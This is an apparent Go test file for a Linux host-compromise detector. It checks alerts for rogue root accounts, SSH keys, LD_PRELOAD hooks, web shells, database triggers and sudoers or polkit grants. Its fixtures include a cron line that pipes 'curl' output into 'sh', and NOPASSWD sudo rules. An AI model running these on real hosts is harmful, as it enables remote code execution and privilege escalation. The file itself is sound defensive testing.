package analyze

import (
	"fmt"
	"slices"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/cpibia/tripwatch/internal/collector"
	"github.com/cpibia/tripwatch/internal/collector/apps"
	"github.com/cpibia/tripwatch/internal/collector/logs"
	"github.com/cpibia/tripwatch/internal/collector/system"
	"github.com/cpibia/tripwatch/internal/collector/web"
	"github.com/cpibia/tripwatch/internal/discovery"
)

func fingerprints(fs []Finding) []string {
	var out []string
	for _, f := range fs {
		out = append(out, f.Severity+" "+f.Fingerprint)
	}
	slices.Sort(out)
	return out
}

func baseState() State {
	return State{
		Accounts:   &system.AccountsResult{Accounts: []system.Account{{Name: "root", UID: 0, Shell: "/bin/bash", Password: "set"}}},
		SSH:        &system.SSHResult{Settings: map[string]string{}, Keys: []system.AuthorizedKey{{User: "root", Fingerprint: "SHA256:old", Type: "ssh-ed25519"}}},
		Privileged: &system.PrivilegedResult{Files: []collector.File{{Path: "/usr/bin/passwd", Mode: "urwxr-xr-x", SHA256: "aa"}}},
		Apps:       &apps.Result{Apps: []apps.Profile{{Path: "/var/www/shop", Admins: []apps.Admin{{ID: "1", Name: "admin"}}}}},
	}
}

// A clean host raises nothing, on the first snapshot or after.
func TestCleanHost(t *testing.T) {
	cur := baseState()
	if f := Evaluate(nil, cur); len(f) != 0 {
		t.Errorf("first snapshot: %v", fingerprints(f))
	}
	prev := baseState()
	if f := Evaluate(&prev, cur); len(f) != 0 {
		t.Errorf("unchanged: %v", fingerprints(f))
	}
}

func TestCompromisedHost(t *testing.T) {
	prev := baseState()
	cur := baseState()
	cur.Accounts.Accounts = append(cur.Accounts.Accounts, system.Account{Name: "svcadmin", UID: 0, Shell: "/bin/bash", Password: "empty", Home: "/var/lib/svcadmin"})
	cur.SSH.Keys = append(cur.SSH.Keys, system.AuthorizedKey{User: "svcadmin", Fingerprint: "SHA256:new", Type: "ssh-ed25519", File: "/var/lib/svcadmin/.ssh/authorized_keys"})
	cur.Hooks = &system.HooksResult{Preload: []string{"/usr/lib/libhide.so"}}
	cur.Processes = &system.ProcessesResult{Processes: []system.Process{{PID: 4242, Comm: "[kworker/0:2]", Exe: "/var/www/.cache/x", ExeDeleted: true}}}
	cur.Privileged.Files = append(cur.Privileged.Files, collector.File{Path: "/usr/lib/.syslib/sh2", Mode: "urwxr-xr-x", SHA256: "bb"})
	cur.Services = &system.ServicesResult{Units: []system.Unit{{File: collector.File{Path: "/etc/systemd/system/sync.service"}, Exec: []string{"ExecStart=/var/www/.cache/sync/syncd"}}, {File: collector.File{Path: "/etc/systemd/system/empty.service"}, Exec: []string{"ExecStart="}}}}
	cur.Web = &web.Result{Apps: []web.AppReport{{Findings: []web.Finding{
		{Kind: web.KindScriptInUploads, File: collector.File{Path: "/var/www/shop/pub/media/x.php"}, Signatures: []string{"eval_request_input"}},
		{Kind: web.KindScriptInUploads, File: collector.File{Path: "/var/www/shop/pub/media/templates/page.php"}},
		{Kind: web.KindEncodedBlob, File: collector.File{Path: "/var/www/shop/lib/fonts.php"}}}}}}
	cur.Weblog = &logs.Result{Events: []logs.Event{{Rule: "script_in_upload_path", Severity: "critical", Method: "POST", Status: 200, Log: "/var/log/nginx/access.log", Evidence: logs.AttackerControlled{Request: "/media/x.php"}}}}
	cur.Apps.Apps[0].Admins = append(cur.Apps.Apps[0].Admins, apps.Admin{ID: "9", Name: "support", Email: "x@example.invalid"})
	cur.Apps.Apps[0].Injected = []apps.Injected{{Where: "config design/footer", Domains: []string{"cdn.example.net"}}}

	got := fingerprints(Evaluate(&prev, cur))
	for _, want := range []string{
		"critical accounts:uid0:svcadmin",
		"high accounts:empty-password:svcadmin",
		"high accounts-change:new:svcadmin",
		"high ssh-change:key:svcadmin|SHA256:new",
		"critical persistence:preload:/usr/lib/libhide.so",
		"high processes:deleted:/var/www/.cache/x:",
		"critical privileged:setid:root|/usr/lib/.syslib/sh2",
		"high privileged-change:new:root|/usr/lib/.syslib/sh2:bb",
		"high persistence:unit-exec:root|/etc/systemd/system/sync.service:ExecStart=/var/www/.cache/sync/syncd",
		"critical web:script_in_upload_dir:/var/www/shop/pub/media/x.php",
		"high web:script_in_upload_dir:/var/www/shop/pub/media/templates/page.php",
		"critical weblog:script_in_upload_path:/media/x.php|/media/x.php/var/log/nginx/access.log",
		"critical apps-change:admin:/var/www/shop:9",
		"high apps:script:/var/www/shop:config design/footer:cdn.example.net",
	} {
		if !slices.Contains(got, want) {
			t.Errorf("missing %q", want)
		}
	}
	if slices.ContainsFunc(got, func(f string) bool { return strings.Contains(f, "fonts.php") }) {
		t.Error("an encoded blob alone must not raise an alert")
	}
}

// On the first snapshot, change rules stay quiet but state rules and log events fire.
func TestFirstSnapshot(t *testing.T) {
	cur := baseState()
	cur.Accounts.Accounts = append(cur.Accounts.Accounts, system.Account{Name: "svcadmin", UID: 0})
	cur.Weblog = &logs.Result{Events: []logs.Event{{Rule: "sensitive_file", Severity: "high", Evidence: logs.AttackerControlled{Request: "/.env"}}}}
	got := fingerprints(Evaluate(nil, cur))
	if !slices.Contains(got, "critical accounts:uid0:svcadmin") || !slices.ContainsFunc(got, func(f string) bool { return strings.Contains(f, "weblog:sensitive_file") }) {
		t.Errorf("findings = %v", got)
	}
	if slices.ContainsFunc(got, func(f string) bool { return strings.Contains(f, "-change:") }) {
		t.Errorf("change findings on a first snapshot: %v", got)
	}
}

// A failed request for a script that is not on the server is a probe and raises nothing; one
// for a script that exists, or that succeeded, still does.
func TestWeblogProbesOfMissingScripts(t *testing.T) {
	event := func(request string, status int, onDisk string) logs.Event {
		return logs.Event{Rule: "script_in_upload_path", Severity: "high", Method: "GET", Status: status, Log: "/var/log/nginx/access.log",
			OnDisk: onDisk, Evidence: logs.AttackerControlled{Request: request}}
	}
	cur := baseState()
	cur.Weblog = &logs.Result{Events: []logs.Event{
		event("/uploads/probe.php", 404, "missing"),
		event("/tmp/phpinfo.php", 502, "missing"),
		event("/uploads/shell.php", 404, "present"),
		event("/uploads/unknown.php", 404, ""),
		event("/uploads/gone.php", 200, "missing"),
	}}
	var got []string
	for _, f := range Evaluate(nil, cur) {
		if f.Kind == "weblog" {
			got = append(got, strings.SplitN(f.Detail, ",", 2)[0])
			if strings.Contains(f.Detail, "shell.php") && !strings.Contains(f.Detail, "The script exists on the server.") {
				t.Errorf("detail does not say the script exists: %s", f.Detail)
			}
		}
	}
	slices.Sort(got)
	if want := []string{"GET /uploads/gone.php", "GET /uploads/shell.php", "GET /uploads/unknown.php"}; !slices.Equal(got, want) {
		t.Errorf("alerts for %v, want %v", got, want)
	}
}

// A run that could not search every data file for code says so, with the files that spent the
// budget.
func TestCodeSearchIncomplete(t *testing.T) {
	cur := baseState()
	cur.Web = &web.Result{CodeSearch: &web.CodeSearch{
		Unsearched: []string{"/var/www/shop/var/report/z"}, UnsearchedMore: 3,
		Heaviest: []web.CodeConsumer{{Path: "/var/www/shop/var/report/a0", CodeBytes: 40 << 20, UID: 33}},
	}}
	for _, f := range Evaluate(nil, cur) {
		if f.Fingerprint == "web:code-search-incomplete" {
			if f.Severity != "high" || !strings.Contains(f.Detail, "/var/www/shop/var/report/z") || !strings.Contains(f.Detail, "and 3 more") ||
				!strings.Contains(f.Detail, "a0: 41943040 bytes of code, owner UID 33") {
				t.Errorf("finding = %+v", f)
			}
			return
		}
	}
	t.Error("no finding for an incomplete code search")
}

// Code planted in the database is judged by change: a new or changed trigger, token or layout
// update raises an alert, a kind read for the first time does not, and stored template code
// raises one on its own.
func TestDatabaseObjects(t *testing.T) {
	read := []string{apps.ObjectTrigger, apps.ObjectAdminToken, apps.ObjectLayoutUpdate, apps.ObjectEmailTemplate}
	prev := baseState()
	prev.Apps.Apps[0].ObjectsRead = read
	prev.Apps.Apps[0].Admins[0].Email = "a@example.com"
	prev.Apps.Apps[0].Objects = []apps.DBObject{
		{Kind: apps.ObjectEmailTemplate, ID: "2", Name: "order_new", Hash: "e1"},
		{Kind: apps.ObjectLayoutUpdate, ID: "3", Name: "default", Hash: "l1"},
	}
	cur := baseState()
	app := &cur.Apps.Apps[0]
	app.ObjectsRead = append(read, apps.ObjectEvent)
	app.Admins[0].Email = "attacker@example.net"
	app.Objects = []apps.DBObject{
		{Kind: apps.ObjectEmailTemplate, ID: "2", Name: "order_new", Hash: "e2"},
		{Kind: apps.ObjectLayoutUpdate, ID: "3", Name: "default", Hash: "l1"},
		{Kind: apps.ObjectTrigger, ID: "trg", Name: "trg", Target: "sales_order (AFTER INSERT)", Hash: "t1"},
		{Kind: apps.ObjectAdminToken, ID: "9", Name: "access", Target: "administrator 1"},
		{Kind: apps.ObjectEvent, ID: "ev", Name: "ev", Hash: "v1"},
		{Kind: apps.ObjectLayoutUpdate, ID: "4", Name: "checkout_cart_index", Hash: "l2", Markers: []string{"gettemplatefilter"}},
		{Kind: apps.ObjectCustomer, ID: "77", Markers: []string{"{{"}},
	}
	got := map[string]string{}
	for _, f := range Evaluate(&prev, cur) {
		got[f.Title] = f.Severity
	}
	for title, sev := range map[string]string{
		"Database email template changed in /var/www/shop":     "medium",
		"New trigger in the database of /var/www/shop":         "critical",
		"New admin API token in the database of /var/www/shop": "high",
		"New layout update in the database of /var/www/shop":   "high",
		"Code in a stored layout update of /var/www/shop":      "critical",
		"Template code in a customer's name in /var/www/shop":  "high",
		"Administrator changed in /var/www/shop: admin":        "high",
	} {
		if got[title] != sev {
			t.Errorf("%q: %q, want %q (all: %v)", title, got[title], sev, got)
		}
	}
	if _, ok := got["New scheduled event in the database of /var/www/shop"]; ok {
		t.Error("a kind read for the first time raised an alert")
	}
	if len(got) != 7 {
		t.Errorf("findings = %v", got)
	}
}

// Comparing two large snapshots stays linear: 80,000 sudo rules, all different between the two,
// took 18 seconds with the list scans this replaced.
func TestEvaluateIsLinear(t *testing.T) {
	rules := func(prefix string) []string {
		out := make([]string, 80_000)
		for i := range out {
			out[i] = prefix + strconv.Itoa(i) + " ALL=(ALL) NOPASSWD: ALL"
		}
		return out
	}
	prev := State{Sudoers: &system.SudoersResult{Files: []system.SudoersFile{{Rules: rules("a")}}}}
	cur := State{Sudoers: &system.SudoersResult{Files: []system.SudoersFile{{Rules: rules("b")}}}}
	start := time.Now()
	findings := Evaluate(&prev, cur)
	if took := time.Since(start); took > 2*time.Second {
		t.Fatalf("Evaluate took %v", took)
	}
	// One alert for the changed file, its detail bounded.
	if len(findings) != 1 || strings.Count(findings[0].Detail, "\n") > 40 {
		t.Fatalf("%d findings", len(findings))
	}
}

func TestDroppedLogEventsRaiseAnAlert(t *testing.T) {
	cur := State{Weblog: &logs.Result{Stats: logs.Stats{
		DroppedEvents:  map[string]int{"critical": 3},
		DroppedSamples: []logs.Dropped{{Rule: "command_in_parameters", Severity: "critical", Path: "/x.php", IP: "203.0.113.9"}},
	}}}
	findings := Evaluate(nil, cur)
	if !slices.ContainsFunc(findings, func(f Finding) bool {
		return f.Severity == "high" && strings.Contains(f.Detail, "/x.php") && strings.Contains(f.Detail, "203.0.113.9")
	}) {
		t.Fatalf("findings = %+v", findings)
	}
}

// Two files at the same path differ in their alert's detail by size and hash.
func TestWebFindingDetailCarriesTheHash(t *testing.T) {
	finding := func(sum string, size int64) Finding {
		cur := State{Web: &web.Result{Apps: []web.AppReport{{Findings: []web.Finding{{Kind: web.KindHiddenInData, File: collector.File{Path: "/var/www/u/.x", SHA256: sum, Size: size}}}}}}}
		for _, f := range Evaluate(nil, cur) {
			if f.Kind == "web" {
				return f
			}
		}
		t.Fatal("no web finding")
		return Finding{}
	}
	decoy, genuine := finding("aaaa", 10), finding("bbbb", 4000)
	if decoy.Fingerprint != genuine.Fingerprint || decoy.Detail == genuine.Detail || !strings.Contains(genuine.Detail, "bbbb") {
		t.Fatalf("decoy %q, genuine %q", decoy.Detail, genuine.Detail)
	}
}

func findingOwners(fs []Finding) map[string]string {
	out := map[string]string{}
	for _, f := range fs {
		out[f.Fingerprint] = f.Owner
	}
	return out
}

// Owners come from where a finding was read, never from its kind alone.
func TestFindingOwners(t *testing.T) {
	gid6, uid33, uid0 := uint32(6), uint32(33), uint32(0)
	gid33 := uint32(33)
	cur := State{
		Accounts: &system.AccountsResult{Groups: []system.Group{{Name: "disk", GID: 6}, {Name: "www-data", GID: 33}}},
		Services: &system.ServicesResult{Units: []system.Unit{
			{File: collector.File{Path: "/var/www/.config/systemd/user/x.service"}, User: "0", Exec: []string{"ExecStart=/dev/shm/x"}},
			{File: collector.File{Path: "/etc/systemd/system/y.service"}, User: "0", Exec: []string{"ExecStart=/dev/shm/y"}},
		}, Environment: []string{
			"LD_PRELOAD=/dev/shm/a.so (var/www/.config/environment.d/x.conf)",
			"LD_PRELOAD=/dev/shm/b.so (etc/environment.d/50-x.conf)",
		}},
		Privileged: &system.PrivilegedResult{Files: []collector.File{
			{Path: "/srv/x/disk", Mode: "grwxr-xr-x", UID: &uid33, GID: &gid6},
			{Path: "/srv/x/mine", Mode: "urwxr-xr-x", UID: &uid33, GID: &uid33},
			{Path: "/srv/x/root", Mode: "urwxr-xr-x", UID: &uid0, GID: &uid0},
			{Path: "/srv/x/web", Mode: "grwxr-xr-x", UID: &uid33, GID: &gid33},
		}},
	}
	owners := findingOwners(Evaluate(nil, cur))
	for fp, want := range map[string]string{
		"persistence:default-env:home /var/www|LD_PRELOAD=/dev/shm/a.so (var/www/.config/environment.d/x.conf)": "home /var/www",
		"persistence:default-env:root|LD_PRELOAD=/dev/shm/b.so (etc/environment.d/50-x.conf)":                   "root",
		"privileged:setid:root|/srv/x/disk":   "root",
		"privileged:setid:uid 33|/srv/x/mine": "uid 33",
		"privileged:setid:root|/srv/x/root":   "root",
		"privileged:setid:uid 33|/srv/x/web":  "uid 33",
		"persistence:unit-exec:home /var/www|/var/www/.config/systemd/user/x.service:ExecStart=/dev/shm/x": "home /var/www",
		"persistence:unit-exec:root|/etc/systemd/system/y.service:ExecStart=/dev/shm/y":                    "root",
	} {
		if got, ok := owners[fp]; !ok || got != want {
			t.Errorf("%s: owner %q (present %v), want %q", fp, got, ok, want)
		}
	}

	// A key of a second account with UID 0 is root's.
	prev := State{SSH: &system.SSHResult{}}
	cur = State{
		Accounts: &system.AccountsResult{Accounts: []system.Account{{Name: "root", UID: 0}, {Name: "toor", UID: 0}, {Name: "www-data", UID: 33}}},
		SSH:      &system.SSHResult{Keys: []system.AuthorizedKey{{User: "toor", Fingerprint: "SHA256:t"}, {User: "www-data", Fingerprint: "SHA256:w"}}},
	}
	owners = findingOwners(Evaluate(&prev, cur))
	if owners["ssh-change:key:toor|SHA256:t"] != "root" || owners["ssh-change:key:www-data|SHA256:w"] != "www-data" {
		t.Errorf("key owners %v", owners)
	}
}

// A cron line seen before in one table is still new in another.
func TestCronLinesAreKnownPerTable(t *testing.T) {
	line := "* * * * * root curl -s http://x | sh"
	prev := State{Scheduled: &system.ScheduledResult{Tables: []system.CronTable{{File: collector.File{Path: "/var/spool/cron/crontabs/www-data"}, Entries: []string{line}}}}}
	cur := State{Scheduled: &system.ScheduledResult{Tables: []system.CronTable{
		{File: collector.File{Path: "/var/spool/cron/crontabs/www-data"}, Entries: []string{line}},
		{File: collector.File{Path: "/etc/cron.d/x"}, Entries: []string{line}},
	}}}
	owners := findingOwners(Evaluate(&prev, cur))
	if owners["persistence-change:cron:/etc/cron.d/x|"+line] != "root" {
		t.Fatalf("the line in root's table raised nothing: %v", owners)
	}
	if homeOwner("/root/.config/environment.d/x.conf") != "root" || homeOwner("/run/user/33/x") == "root" {
		t.Error("/root or /run/user owners")
	}
}

// An existing account made privileged by a standard command raises root's alert.
func TestExistingAccountPromoted(t *testing.T) {
	accounts := func(www system.Account, dockerMembers ...string) *system.AccountsResult {
		return &system.AccountsResult{
			Accounts: []system.Account{{Name: "root", UID: 0, GID: 0, Shell: "/bin/bash", Password: system.PasswordSet}, www},
			Groups:   []system.Group{{Name: "root", GID: 0}, {Name: "www-data", GID: 33}, {Name: "docker", GID: 999, Members: dockerMembers}},
		}
	}
	base := system.Account{Name: "www-data", UID: 33, GID: 33, Shell: "/usr/sbin/nologin", Password: system.PasswordLocked}
	prev := State{Accounts: accounts(base)}
	promoted := base
	promoted.GID, promoted.Shell, promoted.Password = 0, "/bin/bash", system.PasswordSet
	cur := State{Accounts: accounts(promoted, "www-data")}
	got := map[string]Finding{}
	for _, f := range Evaluate(&prev, cur) {
		got[f.Fingerprint] = f
	}
	for _, fp := range []string{
		"accounts-change:member:www-data|999",
		"accounts-change:member:www-data|0",
		"accounts-change:password:www-data|set",
		"accounts-change:shell:www-data|/bin/bash",
	} {
		if f, ok := got[fp]; !ok || f.Owner != "root" {
			t.Errorf("%s: %+v", fp, f)
		}
	}
	renumbered := base
	renumbered.UID = 0
	if _, ok := findingOwners(Evaluate(&prev, State{Accounts: accounts(renumbered)}))["accounts-change:uid:www-data|0"]; !ok {
		t.Error("UID change not reported")
	}
}

// Promotions that keep group names out of the fixed list: a group named in sudoers, a new name
// for docker's GID, a GID changed under the same name, membership only in gshadow, a shell
// copied under the name nologin.
func TestPromotionsByGID(t *testing.T) {
	www := system.Account{Name: "www-data", UID: 33, GID: 33, Shell: "/usr/sbin/nologin", Password: system.PasswordLocked}
	base := func(groups ...system.Group) State {
		return State{
			Accounts: &system.AccountsResult{Accounts: []system.Account{www}, Groups: append([]system.Group{{Name: "docker", GID: 999}, {Name: "deploy", GID: 1001}}, groups...)},
			Sudoers:  &system.SudoersResult{Files: []system.SudoersFile{{Rules: []string{"%deploy ALL=(ALL) NOPASSWD: ALL"}}}},
		}
	}
	critical := func(name string, prev, cur State, fp string) {
		t.Helper()
		for _, f := range Evaluate(&prev, cur) {
			if f.Fingerprint == fp && f.Severity == "critical" && f.Owner == "root" {
				return
			}
		}
		t.Errorf("%s: no critical %s", name, fp)
	}
	prev := base()
	sudo := base()
	sudo.Accounts.Groups[1].Members = []string{"www-data"}
	critical("member of a group sudoers names", prev, sudo, "accounts-change:member:www-data|1001")

	alias := base(system.Group{Name: "dockerx", GID: 999, Members: []string{"www-data"}})
	critical("new name for docker's GID", prev, alias, "accounts-change:member:www-data|999")

	inDeploy := base()
	inDeploy.Accounts.Groups[1].Members = []string{"www-data"}
	toRoot := base()
	toRoot.Accounts.Groups[1] = system.Group{Name: "deploy", GID: 0, Members: []string{"www-data"}}
	critical("group renumbered to 0", inDeploy, toRoot, "accounts-change:member:www-data|0")

	shadow := base()
	shadow.Accounts.Groups[0].ShadowMembers = []string{"www-data"}
	critical("member in gshadow only", prev, shadow, "accounts-change:member:www-data|999")

	copied := base()
	copied.Accounts.Accounts[0].Shell = "/var/lib/syslog/nologin"
	if _, ok := findingOwners(Evaluate(&prev, copied))["accounts-change:shell:www-data|/var/lib/syslog/nologin"]; !ok {
		t.Error("a shell copied under the name nologin was not seen")
	}
}

// A setuid file with UID 0 on a FUSE mount of the web user is that mount's, not root's.
func TestSetuidOnUserMount(t *testing.T) {
	uid0 := uint32(0)
	cur := State{Privileged: &system.PrivilegedResult{Files: []collector.File{
		{Path: "/var/www/m/x", Mode: "urwxr-xr-x", UID: &uid0, GID: &uid0, Mount: "fuse.sshfs uid 33"},
		{Path: "/var/tmp/r", Mode: "urwxr-xr-x", UID: &uid0, GID: &uid0},
	}}}
	owners := findingOwners(Evaluate(nil, cur))
	if owners["privileged:setid:mount fuse.sshfs uid 33|/var/www/m/x"] != "mount fuse.sshfs uid 33" || owners["privileged:setid:root|/var/tmp/r"] != "root" {
		t.Fatalf("owners %v", owners)
	}
}

// A new administrator of a privileged group, a polkit rule and a sudoers group written with
// escapes or another case are all root's alerts.
func TestDormantGrantsAndPolicies(t *testing.T) {
	groups := func(admins ...string) *system.AccountsResult {
		return &system.AccountsResult{Accounts: []system.Account{{Name: "www-data", UID: 33, GID: 33}},
			Groups: []system.Group{{Name: "docker", GID: 999, Admins: admins}, {Name: "deploy", GID: 1001}}}
	}
	prev := State{Accounts: groups(), Sudoers: &system.SudoersResult{}}
	cur := State{Accounts: groups("www-data"), Sudoers: &system.SudoersResult{Files: []system.SudoersFile{
		{File: collector.File{Path: "/etc/polkit-1/rules.d/49-web.rules"}, Rules: []string{"return polkit.Result.YES;"}},
	}}}
	got := map[string]Finding{}
	for _, f := range Evaluate(&prev, cur) {
		got[f.Fingerprint] = f
	}
	if f := got["accounts-change:group-admin:docker|www-data"]; f.Severity != "critical" || f.Owner != "root" {
		t.Errorf("group admin: %+v", f)
	}
	if f := got["persistence-change:policy:/etc/polkit-1/rules.d/49-web.rules|"]; f.Title != "New polkit policy: /etc/polkit-1/rules.d/49-web.rules" || f.Owner != "root" {
		t.Errorf("polkit rule: %+v", f)
	}
	for _, rule := range []string{`%\x64eploy ALL=(ALL) ALL`, "%DEPLOY ALL=(ALL) ALL", "%:deploy ALL=(ALL) ALL"} {
		st := State{Accounts: groups(), Sudoers: &system.SudoersResult{Files: []system.SudoersFile{{Rules: []string{rule}}}}}
		if !privilegedGIDs(st)[1001] {
			t.Errorf("%q does not make deploy privileged", rule)
		}
	}
}

// Owners of many setgid files with many groups are decided in linear time.
func TestSetgidOwnersAreLinear(t *testing.T) {
	acc := &system.AccountsResult{Accounts: []system.Account{{Name: "www-data", UID: 33, GID: 33}}}
	var files []collector.File
	for i := range 4000 {
		acc.Groups = append(acc.Groups, system.Group{Name: fmt.Sprintf("g%d", i), GID: 2000 + i, Members: []string{"www-data"}})
		uid, gid := uint32(33), uint32(2000+i)
		files = append(files, collector.File{Path: fmt.Sprintf("/srv/f%d", i), Mode: "grwxr-xr-x", UID: &uid, GID: &gid})
	}
	start := time.Now()
	Evaluate(nil, State{Accounts: acc, Privileged: &system.PrivilegedResult{Files: files}})
	if took := time.Since(start); took > time.Second {
		t.Fatalf("Evaluate took %v", took)
	}
}

// A policy file changed without new lines (lines reused, a condition removed) or removed is
// still an alert, with the lines in its detail; groups granted by polkit and doas count.
func TestPolicyFileChanges(t *testing.T) {
	file := func(sum string, rules ...string) system.SudoersFile {
		return system.SudoersFile{File: collector.File{Path: "/etc/polkit-1/rules.d/50.rules", SHA256: sum}, Rules: rules}
	}
	prev := State{Sudoers: &system.SudoersResult{Files: []system.SudoersFile{file("a", "if (a) {", "if (subject.user == \"x\")", "return YES;", "}")}}}
	cur := State{Sudoers: &system.SudoersResult{Files: []system.SudoersFile{file("b", "if (a) {", "return YES;", "}")}}}
	fs := Evaluate(&prev, cur)
	if len(fs) != 1 || !strings.Contains(fs[0].Detail, `- if (subject.user == "x")`) || fs[0].Owner != "root" {
		t.Fatalf("condition removed: %+v", fs)
	}
	if fs := Evaluate(&prev, State{Sudoers: &system.SudoersResult{}}); len(fs) != 1 || !strings.Contains(fs[0].Title, "removed") {
		t.Fatalf("file removed: %+v", fs)
	}
	groups := &system.AccountsResult{Groups: []system.Group{{Name: "ops", GID: 1500}, {Name: "web", GID: 1600}, {Name: "doers", GID: 1700}}}
	st := State{Accounts: groups, Sudoers: &system.SudoersResult{Files: []system.SudoersFile{{Rules: []string{
		"Identity=unix-group:ops", `if (subject.isInGroup("web")) return polkit.Result.YES;`, "permit nopass :doers as root"}}}}}
	gids := privilegedGIDs(st)
	if !gids[1500] || !gids[1600] || !gids[1700] {
		t.Fatalf("policy groups: %v", gids)
	}
}

// Many groups and a rule naming many of them are resolved in linear time.
func TestPrivilegedGIDsAreLinear(t *testing.T) {
	acc := &system.AccountsResult{}
	var names []string
	for i := range 80_000 {
		acc.Groups = append(acc.Groups, system.Group{Name: fmt.Sprintf("g%d", i), GID: 2000 + i})
		names = append(names, fmt.Sprintf("%%g%d", i))
	}
	st := State{Accounts: acc, Sudoers: &system.SudoersResult{Files: []system.SudoersFile{{Rules: []string{strings.Join(names, ",") + " ALL=(ALL) ALL"}}}}}
	start := time.Now()
	if gids := privilegedGIDs(st); len(gids) != 80_001 {
		t.Fatalf("%d privileged GIDs", len(gids))
	}
	// Linear work takes well under a second (a few under the race detector); the per-name scan
	// this replaced took close to a minute.
	if took := time.Since(start); took > 10*time.Second {
		t.Fatalf("privilegedGIDs took %v", took)
	}
}

// A grant added after many harmless lines is shown first, and the cut is stated.
func TestRuleDiffShowsGrantsFirst(t *testing.T) {
	var cur []string
	for i := range 41 {
		cur = append(cur, fmt.Sprintf("Cmnd_Alias C%d = /bin/true", i))
	}
	cur = append(cur, "www-data ALL=(ALL) NOPASSWD: ALL")
	got := ruleDiff([]string{"deny www-data"}, cur)
	lines := strings.Split(got, "\n")
	if lines[0] != "+ www-data ALL=(ALL) NOPASSWD: ALL" || lines[1] != "- deny www-data" {
		t.Fatalf("grants not first:\n%s", got)
	}
	if len(lines) != maxDiffLines+1 || lines[maxDiffLines] != "(3 more lines added and 0 removed not shown: the full diff is on the alert's page)" {
		t.Fatalf("cut not stated:\n%s", got)
	}
}

// A policy file another account can write is critical; a change of owner or mode is root's alert.
func TestPolicyFileAccess(t *testing.T) {
	uid := func(v uint32) *uint32 { return &v }
	file := func(owner uint32, mode string) system.SudoersFile {
		return system.SudoersFile{File: collector.File{Path: "/etc/polkit-1/rules.d/50.rules", SHA256: "a", UID: uid(owner), GID: uid(0), Mode: mode}}
	}
	dir := collector.File{Path: "/etc/polkit-1/rules.d", UID: uid(0), GID: uid(0), Mode: "drwx------"}
	prev := State{Sudoers: &system.SudoersResult{Files: []system.SudoersFile{file(0, "-rw-r--r--")}, Dirs: []collector.File{dir}}}
	if fs := Evaluate(&prev, prev); len(fs) != 0 {
		t.Fatalf("root's policy raised: %+v", fs)
	}
	got := map[string]Finding{}
	for _, f := range Evaluate(&prev, State{Sudoers: &system.SudoersResult{Files: []system.SudoersFile{file(33, "-rw-r--r--")}, Dirs: []collector.File{dir}}}) {
		got[f.Fingerprint] = f
	}
	if f := got["persistence:policy-writable:/etc/polkit-1/rules.d/50.rules|owner 33, group 0, mode -rw-r--r--"]; f.Severity != "critical" || f.Owner != "root" {
		t.Fatalf("writable policy: %+v", got)
	}
	if f := got["persistence-change:policy-access:/etc/polkit-1/rules.d/50.rules|owner 33, group 0, mode -rw-r--r--"]; f.Severity != "high" || f.Owner != "root" {
		t.Fatalf("owner change: %+v", got)
	}
	wide := dir
	wide.Mode = "dtrwxrwxrwx"
	acl := dir
	acl.ACL, acl.ACLWrite = "0123456789abcdef", true
	none := policyTrust{}
	for _, f := range []collector.File{wide, acl, {Mode: "-rw-rw-r--", UID: uid(0), GID: uid(100)}, {Mode: "-rw-r--r--", UID: uid(0), Mount: "fuse uid 1000"}} {
		if !foreignWritable(f, none) {
			t.Errorf("not writable by others: %+v", f)
		}
	}
	if foreignWritable(collector.File{Mode: "-rw-rw-r--", UID: uid(0), GID: uid(0)}, none) {
		t.Error("root group counted as foreign")
	}
	readOnly := dir
	readOnly.ACL = "0123456789abcdef"
	if foreignWritable(readOnly, none) {
		t.Error("a read-only ACL counted as a writer")
	}

	// polkit's own account owns its rule directories on a standard install; elsewhere it is
	// an account like any other.
	accounts := &system.AccountsResult{Accounts: []system.Account{{Name: "polkitd", UID: 997, GID: 997, Shell: "/usr/sbin/nologin"}}, Groups: []system.Group{{Name: "polkitd", GID: 997}}}
	daemon := collector.File{Path: "/usr/share/polkit-1/rules.d", UID: uid(997), GID: uid(997), Mode: "drwx------"}
	st := State{Accounts: accounts, Sudoers: &system.SudoersResult{Dirs: []collector.File{daemon}}}
	if fs := Evaluate(nil, st); len(fs) != 0 {
		t.Fatalf("polkitd's directory raised: %+v", fs)
	}
	daemon.Path = "/etc/sudoers.d"
	if !foreignWritable(daemon, policyAccounts(accounts)) {
		t.Error("polkitd trusted outside polkit")
	}

	// The daemon's name on another account, its UID shared, or a member in its group, is not
	// the daemon.
	rulesDir := collector.File{Path: "/etc/polkit-1/rules.d", UID: uid(33), GID: uid(0), Mode: "drwx------"}
	shared := &system.AccountsResult{Accounts: []system.Account{{Name: "www-data", UID: 33, Shell: "/usr/sbin/nologin"}, {Name: "polkit", UID: 33, Shell: "/usr/sbin/nologin"}}}
	if !foreignWritable(rulesDir, policyAccounts(shared)) {
		t.Error("polkit sharing www-data's UID trusted")
	}
	group := collector.File{Path: "/etc/polkit-1/rules.d", UID: uid(0), GID: uid(997), Mode: "drwxrwx---"}
	if foreignWritable(group, policyAccounts(accounts)) {
		t.Error("polkitd's own group not trusted")
	}
	joined := &system.AccountsResult{Accounts: accounts.Accounts, Groups: []system.Group{{Name: "polkitd", GID: 997, Members: []string{"www-data"}}}}
	if !foreignWritable(group, policyAccounts(joined)) {
		t.Error("polkitd's group with www-data in it trusted")
	}

	// /usr/local of root:staff 2775 is root's while staff is empty, and makes staff privileged.
	local := collector.File{Path: "/usr/local", UID: uid(0), GID: uid(50), Mode: "dgrwxrwsr-x"}
	staff := &system.AccountsResult{Accounts: []system.Account{{Name: "root", UID: 0}}, Groups: []system.Group{{Name: "staff", GID: 50, Members: []string{"root"}}}}
	if foreignWritable(local, policyAccounts(staff)) {
		t.Error("empty staff group counted as foreign")
	}
	staff.Groups[0].Members = append(staff.Groups[0].Members, "alice")
	if !foreignWritable(local, policyAccounts(staff)) {
		t.Error("staff with alice in it trusted")
	}
	if gids := privilegedGIDs(State{Sudoers: &system.SudoersResult{Dirs: []collector.File{local}}}); !gids[50] {
		t.Error("a group that can write a policy directory is not privileged")
	}
}

// The detail of a writable policy says who can write it, why that gives root and the usual fix.
func TestPolicyWriteDetailIsPlain(t *testing.T) {
	u0, u1000 := uint32(0), uint32(1000)
	acc := &system.AccountsResult{
		Accounts: []system.Account{{Name: "root", UID: 0}, {Name: "deploy", UID: 1000, GID: 1000}},
		Groups:   []system.Group{{Name: "root", GID: 0}, {Name: "deploy", GID: 1000}},
	}
	trusted := policyAccounts(acc)
	root := policyWriteDetail(collector.File{Path: "/", UID: &u0, GID: &u0, Mode: "drwxrwxrwx"}, trusted, acc)
